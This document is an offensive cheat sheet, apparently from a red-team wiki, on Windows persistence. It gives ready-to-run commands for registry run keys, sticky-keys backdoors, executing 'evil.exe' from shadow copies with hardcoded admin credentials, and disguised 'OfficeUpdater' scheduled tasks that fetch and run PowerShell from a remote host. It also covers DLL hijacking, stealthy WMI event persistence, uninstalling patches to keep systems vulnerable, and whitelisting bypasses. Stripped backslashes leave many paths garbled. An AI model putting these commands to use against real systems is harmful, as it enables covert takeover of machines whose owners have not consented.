<h2 id="windows-persistence-methods">Windows Persistence Methods<a class="headerlink" href="#windows-persistence-methods" title="Permanent link">&para;</a></h2>
<h3 id="registry-keys">Registry Keys<a class="headerlink" href="#registry-keys" title="Permanent link">&para;</a></h3>
<h4 id="modify-registry-keys">Modify registry keys<a class="headerlink" href="#modify-registry-keys" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>#Add a key/value
reg add \ /v &quot;&quot;&quot; /t /d

#Delete a key/value
reg delete \ /v &quot;&quot;
</pre></div>
</td></tr></table>

<h4 id="userinit-key">Userinit Key<a class="headerlink" href="#userinit-key" title="Permanent link">&para;</a></h4>
<p>This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:windowssystem32userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>HKEY_LOCAL_MACHINESoftwareMicrosoftWindows NTCurrentVersionWinlogonUserinit
HKLMSoftwareMicrosoftWindows NTCurrentVersionWinlogonUserinit = (REG_SZ) C:windowssystem32userinit.exe,c:windowsbadprogram.exe
</pre></div>
</td></tr></table>

<h4 id="run-key">Run Key<a class="headerlink" href="#run-key" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>#System Wide
HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun
HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRunOnce

#Current Logged-On User Only
HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionRun
HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionRunOnce
</pre></div>
</td></tr></table>

<h4 id="list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run">List Image File Execution Options (Debugger file executed when the target file is run)<a class="headerlink" href="#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>HKLMSoftwareMSWindowsNTCurrentVersionImage File Execution Optionsnotepad.exedebugger(REG_SZ = cmd.exe)
</pre></div>
</td></tr></table>

<h4 id="appinit_dlls">AppInit_DLLs<a class="headerlink" href="#appinit_dlls" title="Permanent link">&para;</a></h4>
<p>Load custom DLLs each time a program runs (If it loads USER32.dll). This is checked by most AV!</p>
<p>This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>HKLMSOFTWAREMicrosoftWindowsCurrentVersionWindowsAppInit_DLLs
</pre></div>
</td></tr></table>

<h4 id="no-reboot-sethcutilman-option-using-a-debugger-key">No-reboot sethc/utilman option using a "debugger" key<a class="headerlink" href="#no-reboot-sethcutilman-option-using-a-debugger-key" title="Permanent link">&para;</a></h4>
<p>Navigate to HKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Options<br />
Make key called "sethc.exe"<br />
Make a REG_SQ value called "Debugger"<br />
Assign it "c:windowssystem32cmd.exe" as the value<br />
Hit SHIFT 5 times and get a shell as nt authoritysystem</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>reg add &quot;\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe&quot; /v Debugger /t REG_SZ /d &quot;c:windowssystem32cmd.exe&quot;
reg add &quot;\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionsutilman.exe&quot; /v Debugger /t REG_SZ /d &quot;c:windowssystem32cmd.exe&quot;
</pre></div>
</td></tr></table>

<p>Remove the debugger key</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>reg delete &quot;\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe&quot; /f
reg delete &quot;\hostnameHKLMSoftwareMicrosoftWindows NTCurrentVersionImage File Execution Optionsutilman.exe&quot; /f
</pre></div>
</td></tr></table>

<h3 id="file-storage-locations">File Storage Locations<a class="headerlink" href="#file-storage-locations" title="Permanent link">&para;</a></h3>
<h4 id="startup-folders">Startup Folders<a class="headerlink" href="#startup-folders" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>#All Users - Windows XP
C:Documents and SettingsAll UsersStart MenuProgramsStartup

#All Users - Windows Vista+
C:ProgramDataMicrosoftWindowsStart MenuProgramsStartup

#User Profile - Windows XP
C:Documents and Settings\Start MenuProgramsStartup

#User Profile - Windows Vista+
C:Users\AppDataRoamingMicrosoftWindowsStart MenuProgramsStartup
</pre></div>
</td></tr></table>

<h4 id="sethcutilman-replacement">SETHC/UTILMAN Replacement<a class="headerlink" href="#sethcutilman-replacement" title="Permanent link">&para;</a></h4>
<p>Replace these binaries, may require a reboot to take effect</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="c">%WINDIR%System32sethc.exe</span>
<span class="c">%WINDIR%System32utilman.exe</span>
</pre></div>
</td></tr></table>

<p>Hit shift 5 times = sethc.exe run by SYSTEM<br />
Windows key + U = utilman.exe run by SYSTEM</p>
<h4 id="volume-shadow-copy-restore-points">Volume Shadow Copy (Restore Points)<a class="headerlink" href="#volume-shadow-copy-restore-points" title="Permanent link">&para;</a></h4>
<p>Windows service that's constantly running – takes snapshots of system directories</p>
<p>Drop Malware -&gt; Create VSC (ReadOnly) -&gt; Delete Malware -&gt; Use WMIC to run VSC of malware</p>
<p>Registry Key to Disable Volume Shadow Copy</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>HKLMSystemCurrentControlSetControlBackupRestoreFilesNotToSnapshot
</pre></div>
</td></tr></table>

<h4 id="vssadmin-native-windows-utility">VSSADMIN – native windows utility<a class="headerlink" href="#vssadmin-native-windows-utility" title="Permanent link">&para;</a></h4>
<p>vssadmin create command only applies to Server OS (Win2k3,2008)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>vssadmin list shadows
vssadmin create shadow /for=C:
wmic /node:DC1 /user:DOMAINdomainadminsvc /password:domainadminsvc123 process call create &quot;cmd /c vssadmin create shadow /for=C
mklink /D C:VscAccess \?GLOBALROOTDeviceHardDiskVolumeShadowCopy1
copy \?GLOBALROOTDeviceHardDiskVolumeShadowCopy4pathtosomefile e:files
</pre></div>
</td></tr></table>

<h4 id="use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy">Use WMIC process call to run an .exe from a Volume Shadow Copy<a class="headerlink" href="#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>wmic process call create \.GLOBALROOTDeviceHarddiskVolumeShadowCopy1windowssystem32evil.exe
</pre></div>
</td></tr></table>

<p>This process will not show the imagename (executable filename) or commandline parameters in the task list.<br />
The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# wmis -U DOMAINdomainadminsvc%domainadminsvc123 //ServerName \?GLOBALROOTDeviceHarddiskVolumeShadowCopy1Windowssystem32evil.exe
NTSTATUS: NT_STATUS_OK - Success
</pre></div>
</td></tr></table>

<p>In Kali Linux you could use the WMIS package to do the same thing:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>wmis -U DOMAINdomainadminsvc%domainadminsvc123 //ServerName \?GLOBALROOTDeviceHarddiskVolumeShadowCopy1Windowssystem32evil.exe
NTSTATUS: NT_STATUS_OK - Success
</pre></div>
</td></tr></table>

<h3 id="task-scheduling">Task Scheduling<a class="headerlink" href="#task-scheduling" title="Permanent link">&para;</a></h3>
<h4 id="at">AT<a class="headerlink" href="#at" title="Permanent link">&para;</a></h4>
<p>Executes as system and must be an Admin to run it. Check groups with whoami /groups</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>at 13:20 /interactive cmd

net user    arget /user:Domainuser pass
net time    arget
at  arget 13:20 c:tempevil.bat
</pre></div>
</td></tr></table>

<h4 id="schtasks">SCHTASKS<a class="headerlink" href="#schtasks" title="Permanent link">&para;</a></h4>
<p>Any user can create a task</p>
<p>Schedule a binary to run with arguments on system events</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>#On System Startup
schtasks /create /TN OfficeUpdaterA /tr &quot;&quot;c:evil32.exe&quot; -k password -n services&quot; /SC onstart /RU system /RL HIGHEST
schtasks /create /TN OfficeUpdaterD /tr &quot;&quot;c:Program Filesevil32.exe&quot; -k password -n services&quot; /SC onstart /RU system /RL HIGHEST

#On User Login
schtasks /create /TN OfficeUpdaterB /tr &quot;&quot;c:evil32.exe&quot; -k password -n services&quot; /SC onlogon
schtasks /create /TN OfficeUpdaterE /tr &quot;&quot;c:Program Filesevil32.exe&quot; -k password -n services&quot; /SC onlogon

#On Idle
schtasks /create /TN OfficeUpdaterC /tr &quot;&quot;c:evil32.exe&quot; -k password -n services&quot; /SC onidle /i 30&#39;&#39;&#39;&#39;
schtasks /create /TN OfficeUpdaterF /tr &quot;&quot;c:Program Filesevil32.exe&quot; -k password -n services&quot; /SC onidle /i 60
</pre></div>
</td></tr></table>

<p>Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploitwindowsmiscpsh_web_delivery'</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>#(X86) - On User Login
schtasks /create /tn OfficeUpdaterA /tr &quot;c:windowssystem32WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http:///&#39;&#39;&#39;))&#39;&quot; /sc onlogon /ru System

#(X86) - On System Start
schtasks /create /tn OfficeUpdaterB /tr &quot;c:windowssystem32WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http:///&#39;&#39;&#39;))&#39;&quot; /sc onstart /ru System

#(X86) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr &quot;c:windowssystem32WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http:///&#39;&#39;&#39;))&#39;&quot; /sc onidle /i 30

#(X64) - On User Login
schtasks /create /tn OfficeUpdaterA /tr &quot;c:windowssyswow64WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http:///&#39;&#39;&#39;))&#39;&quot; /sc onlogon /ru System

#(X64) - On System Start
schtasks /create /tn OfficeUpdaterB /tr &quot;c:windowssyswow64WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http:///&#39;&#39;&#39;))&#39;&quot; /sc onstart /ru System

#(X64) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr &quot;c:windowssyswow64WindowsPowerShellv1.0powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://192.168.95.195:8080/kBBldxiub6&#39;&#39;&#39;))&#39;&quot; /sc onidle /i 30
</pre></div>
</td></tr></table>

<h4 id="additional-notes">Additional Notes<a class="headerlink" href="#additional-notes" title="Permanent link">&para;</a></h4>
<p>Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash () AND quotation marks ("):</p>
<p>Delete scheduled task without prompting</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>schtasks /delete /f /TN taskname
</pre></div>
</td></tr></table>

<p>Detailed scheduled tasks listing</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>schtasks /query /V /FO list
</pre></div>
</td></tr></table>

<p>View scheduled tasks log (for troubleshooting)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>notepad c:windowsschedlgu.txt (Windows XP)

notepad c:windowstasksschedlgu.txt (Vista+)
</pre></div>
</td></tr></table>

<h3 id="windows-service">Windows Service<a class="headerlink" href="#windows-service" title="Permanent link">&para;</a></h3>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>sc query
sc create &lt;\Target(optional)&gt; binPath= type= share start= auto DisplayName=
sc delete
</pre></div>
</td></tr></table>

<h3 id="dll-hijacking">DLL-Hijacking<a class="headerlink" href="#dll-hijacking" title="Permanent link">&para;</a></h3>
<p>Order of DLL Loading</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>1. The directory from which the application is loaded
2. The current directory
3. The system directory, usually C:\Windows\System32\ (The GetSystemDirectory function is called to obtain this directory.)
4. The 16-bit system directory - There is no dedicated function to retrieve the path of this directory, but it is searched as well.
5. The Windows directory. The GetWindowsDirector function is called to obtain this directory.
6. The directories that are listed in the PATH environment variable.
</pre></div>
</td></tr></table>

<p>Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex.</p>
<p>Older list of dlls as well (2010). <a href="https://www.exploit-db.com/dll-hijacking-vulnerable-applications/">https://www.exploit-db.com/dll-hijacking-vulnerable-applications/</a></p>
<p>On Windows 7 there are three executables that could be exploited and associated DLLs listed below</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">C</span><span class="o">:</span><span class="n">windowsehomeMcx2Prov</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsehomeCRYPTBASE</span><span class="o">.</span><span class="na">dll</span>

<span class="n">C</span><span class="o">:</span><span class="n">windowsSystem32sysprepsysprep</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32sysprepCRYPTSP</span><span class="o">.</span><span class="na">dll</span>
<span class="n">C</span><span class="o">:</span><span class="n">windowsSystem32sysprepCRYPTBASE</span><span class="o">.</span><span class="na">dll</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32sysprepRpcRtRemote</span><span class="o">.</span><span class="na">dll</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32sysprepUxTheme</span><span class="o">.</span><span class="na">dll</span>

<span class="n">C</span><span class="o">:</span><span class="n">windowsSystem32cliconfg</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32NTWDBLIB</span><span class="o">.</span><span class="na">DLL</span>
</pre></div>
</td></tr></table>

<p>On Windows 8 there are also three executables that could be exploited and associated DLLs listed below</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">C</span><span class="o">:</span><span class="n">windowsSystem32sysprepsysprep</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">windowsSystem32sysprepCRYPTBASE</span><span class="o">.</span><span class="na">dll</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32Sysprepdwmapi</span><span class="o">.</span><span class="na">dll</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32SysprepSHCORE</span><span class="o">.</span><span class="na">dll</span>

<span class="n">C</span><span class="o">:</span><span class="n">windowsSystem32cliconfg</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32NTWDBLIB</span><span class="o">.</span><span class="na">DLL</span>

<span class="n">C</span><span class="o">:</span><span class="n">windowsSystem32pwcreator</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32vds</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32UReFS</span><span class="o">.</span><span class="na">DLL</span>
</pre></div>
</td></tr></table>

<p>Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">C</span><span class="o">:</span><span class="n">windowsSystem32sysprepsysprep</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32SysprepSHCORE</span><span class="o">.</span><span class="na">dll</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32SysprepOLEACC</span><span class="o">.</span><span class="na">DLL</span>

<span class="n">C</span><span class="o">:</span><span class="n">windowsSystem32cliconfg</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32NTWDBLIB</span><span class="o">.</span><span class="na">DLL</span>

<span class="n">C</span><span class="o">:</span><span class="n">windowsSystem32pwcreator</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">WindowsSystem32vds</span><span class="o">.</span><span class="na">exe</span>
<span class="n">C</span><span class="o">:</span><span class="n">Program</span> <span class="n">FilesCommon</span> <span class="n">Filesmicrosoft</span> <span class="n">sharedinkCRYPTBASE</span><span class="o">.</span><span class="na">dll</span>
<span class="n">C</span><span class="o">:</span><span class="n">Program</span> <span class="n">FilesCommon</span> <span class="n">Filesmicrosoft</span> <span class="n">sharedinkCRYPTSP</span><span class="o">.</span><span class="na">dll</span>
<span class="n">C</span><span class="o">:</span><span class="n">Program</span> <span class="n">FilesCommon</span> <span class="n">Filesmicrosoft</span> <span class="n">sharedinkdwmapi</span><span class="o">.</span><span class="na">dll</span>
<span class="n">C</span><span class="o">:</span><span class="n">Program</span> <span class="n">FilesCommon</span> <span class="n">Filesmicrosoft</span> <span class="n">sharedinkUSERENV</span><span class="o">.</span><span class="na">dll</span>
<span class="n">C</span><span class="o">:</span><span class="n">Program</span> <span class="n">FilesCommon</span> <span class="n">Filesmicrosoft</span> <span class="n">sharedinkOLEACC</span><span class="o">.</span><span class="na">dll</span>
</pre></div>
</td></tr></table>

<h4 id="linkinfodll-replacement">linkinfo.dll Replacement<a class="headerlink" href="#linkinfodll-replacement" title="Permanent link">&para;</a></h4>
<p>Windows explorer in older systems loads linkinfo.dll from c:windows over c:windowssystem32 if it exists</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>copy evil.dll c:windowslinkinfo.dll
</pre></div>
</td></tr></table>

<h3 id="wmi-event-persistence-via-powershell">WMI Event Persistence via Powershell<a class="headerlink" href="#wmi-event-persistence-via-powershell" title="Permanent link">&para;</a></h3>
<p>WMI Event persistence explained, you can find a bloated version in powersploit.<br />
Three parts to this:<br />
* WMI Event Filter<br />
* Event Consumer<br />
* Filter/Consumer Binding<br />
This technique gets you <em>SYSTEM</em> level persistence, requires admin rights to execute.<br />
Autoruns doesn't even check for this yet. (doubt any AVs are either)<br />
Difficult to detect, Difficult to remove if you dont know what youre doing.</p>
<h4 id="wmi-event-filter">WMI Event Filter<a class="headerlink" href="#wmi-event-filter" title="Permanent link">&para;</a></h4>
<p>Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$EventFilter = ([WMICLASS]&quot;\.rootsubscription:__EventFilter&quot;).CreateInstance()
$EventFilter.QueryLanguage = &quot;WQL&quot;
$EventFilter.Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &amp;gt;= 240 AND TargetInstance.SystemUpTime &amp;lt; 325&quot;
$EVentFilter.EventNamespace = &quot;rootcimv2&quot;
$EventFilter.Name = &quot;OBVIOUSHACKER&quot;
$Result = $EventFilter.Put()
$Filter = $Result.Path
</pre></div>
</td></tr></table>

<p><a href="http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx</a></p>
<h4 id="event-consumer">Event Consumer<a class="headerlink" href="#event-consumer" title="Permanent link">&para;</a></h4>
<p>Configure what to execute once the event occurs.<br />
Current example is just a ping.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$InstanceConsumer = ([wmiclass]&quot;\.rootsubscription:CommandLineEventConsumer&quot;).CreateInstance()
$InstanceConsumer.Name = &quot;OBVIOUSHACKER&quot;
$InstanceConsumer.CommandLineTemplate = &quot;ping 127.0.0.1 -n 100&quot; #CMD TO EXECUTE HERE
$InstanceConsumer.WorkingDirectory = &quot;C:\windows\system32&quot;
$Result = $InstanceConsumer.Put()
$Consumer = $Result.Path
</pre></div>
</td></tr></table>

<p><a href="http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx</a><br />
<a href="http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx</a></p>
<h4 id="filterconsumer-binding">Filter/Consumer Binding<a class="headerlink" href="#filterconsumer-binding" title="Permanent link">&para;</a></h4>
<p>This is the object that correlates the Filter with the Consumer.<br />
Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$InstanceBinding = ([wmiclass]&quot;\.rootsubscription:__FilterToConsumerBinding&quot;).CreateInstance()
$InstanceBinding.Filter = $Filter
$InstanceBinding.Consumer = $Consumer
$Result = $InstanceBinding.Put()
</pre></div>
</td></tr></table>

<p><a href="http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx</a></p>
<h4 id="removal">REMOVAL<a class="headerlink" href="#removal" title="Permanent link">&para;</a></h4>
<p>The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-WmiObject __eventFilter -namespace rootsubscription -filter &quot;name=&#39;OBVIOUSHACKER&#39;&quot;| Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace rootsubscription -filter &quot;name=&#39;OBVIOUSHACKER&#39;&quot; | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding -Namespace rootsubscription | Where-Object { $_.filter -match &#39;OBVIOUSHACKER&#39;} | Remove-WmiObject
</pre></div>
</td></tr></table>

<p><a href="http://www.exploit-monday.com/2013/04/PersistenceWithPowerShell.html">Some more detailed information on the subject</a></p>
<p><a href="http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/">http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/</a></p>
<h3 id="malicious-outlook-rules">Malicious Outlook Rules<a class="headerlink" href="#malicious-outlook-rules" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/">https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/</a></li>
<li>Ruler</li>
<li><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></li>
</ul>
<h3 id="windows-remote-management-winrm-psremoting">Windows Remote Management (WinRM) / PSRemoting<a class="headerlink" href="#windows-remote-management-winrm-psremoting" title="Permanent link">&para;</a></h3>
<ul>
<li>Listens on 5985/5986 by default and allows interactive shell access over HTTP/S</li>
<li>Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module)</li>
<li>Metasploit has multiple modules for locating the service and gaining shells over WinRM</li>
</ul>
<p><em>Connect to a remote host with WinRM from local Windows host</em></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Enable-PSRemoting
Set-Item -Path WSMan:localhostClientTrustedHosts * -force
or
Set-Item -Path WSMan:localhostClientTrustedHosts -value &quot;&quot; -Force
$cred = Get-Credential
Invoke-Command -ComputerName -ScriptBlock { gci c: } -credential $cred
</pre></div>
</td></tr></table>

<h3 id="uninstall-a-patch-to-leave-the-system-vulnerable">Uninstall a patch to leave the system vulnerable<a class="headerlink" href="#uninstall-a-patch-to-leave-the-system-vulnerable" title="Permanent link">&para;</a></h3>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>wusa.exe /uninstall /kb:976932
</pre></div>
</td></tr></table>

<h3 id="create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords">Create custom DLL for password filters and install on DC to capture changed passwords<a class="headerlink" href="#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html">http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html</a></li>
</ul>
<h2 id="application-whitelisting-bypass-techniques">Application Whitelisting Bypass Techniques<a class="headerlink" href="#application-whitelisting-bypass-techniques" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt">SubTee Collection of Whitelist Bypass Techniques </a><br />
<a href="https://bitbucket.org/jsthyer/wevade.git">https://bitbucket.org/jsthyer/wevade.git</a></p>
<p>Version .0.0.3</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>1. IEExec -This technique may work in certain environments. Its relies on the fact that many organizations trust executables signed
by Microsoft. We can misuse this trust by launching a specially crafted .NET application.
Example Here: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/

2. Rundll32.exe

3. ClickOnce Applications dfsvc.exe dfshim.dll

4. XBAP - XML Browser Applications WPF PresentationHost.exe

5. MD5 Hash Collision
http://www.mathstat.dal.ca/~selinger/md5collision/

6. PowerShell - Specifically Reflective Execution
[Reflective DLL Injection with PowerShell][10]
https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf

7. .HTA Application Invoke PowerShell Scripts
Launched by mshta.exe, bypasses IE security settings as well.

8. bat, vbs, ps1
